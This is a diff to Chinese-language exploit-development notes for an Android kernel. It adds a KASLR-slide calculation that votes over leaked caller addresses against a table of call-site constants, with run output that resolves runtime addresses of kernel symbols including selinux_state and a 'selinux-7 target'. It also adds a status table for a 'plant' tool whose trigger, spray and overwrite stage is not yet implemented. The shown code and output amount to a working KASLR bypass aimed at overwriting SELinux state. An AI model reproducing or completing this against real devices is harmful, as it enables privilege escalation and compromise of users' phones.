@@ -62,3 +62,44 @@ adb shell /data/local/tmp/slideprobe3
 llvm-nm -n -S kernel.elf > nm.txt
 python scripts/resolve_symbols.py nm.txt <slide> <caller...>
 ```
+
+## 7. 自动化（2026-10-25 深夜，`scripts/harness/plant.c --preflight`）
+
+原来的单点相减有个坑：记录里的 `caller` 是 **`函数+偏移`**（例如 `kalIoctlByBssIdx+0x75`），
+拿它减函数入口永远对不齐 2 MiB。改成**调用点表 + 投票**：
+
+```c
+/* 每个调用点的静态地址 = nm 里的函数入口 + 文本 trace 里观察到的偏移（每构建固定） */
+static const uint64_t g_callsites[] = {
+    0xffffffc0801d2f04ULL,   /* worker_thread+0x248    */
+    0xffffffc08027cf44ULL,   /* rcu_gp_kthread+0xc8    */
+    0xffffffc08026b600ULL,   /* __migrate_disable+0x10 */
+    0xffffffc080230900ULL,   /* cfi_brk_handler+0xdc   */
+    0xffffffc0801c6a00ULL,   /* rcu_gp_fqs_loop+0x11c  */
+};
+```
+
+对每个 `caller` 减每个调用点常量，只保留 **2 MiB 整数倍** 的结果并计数，
+**票数 ≥ 2** 才算命中。实测输出：
+
+```
+debug: len36 records = 215
+slide candidate 0x2459c00000  votes=43
+slide = 0x2459c00000   (2MiB aligned: yes)
+  _text             = 0xffffffe4d9c00000
+  begin_new_exec    = 0xffffffe4d9ecf910
+  do_timer_create   = 0xffffffe4d9fa6f1c
+  __arm64_sys_getpid= 0xffffffe4d9e3d960
+  selinux_state     = 0xffffffe4dc559630
+  selinux-7 target  = 0xffffffe4dc559629
+```
+
+43 票一致 —— 这个不再是"算出来的一个数"，而是**可重复的测量**。
+
+## 8. plant 阶段机的当前状态
+
+| 模式 | 行为 | 状态 |
+| --- | --- | --- |
+| `--preflight` | 量 slide、核对 cache 几何、打印全部运行时地址 | ✅ 可用（只读） |
+| `--arm-test` | 按触发要求装 32 个 `SIGEV_SIGNAL` 定时器再删掉 | ✅ 可用（只读） |
+| `--run` | 真正的触发/占位/改写 | 未实现，且必须同时给 `--i-accept-reboot` |
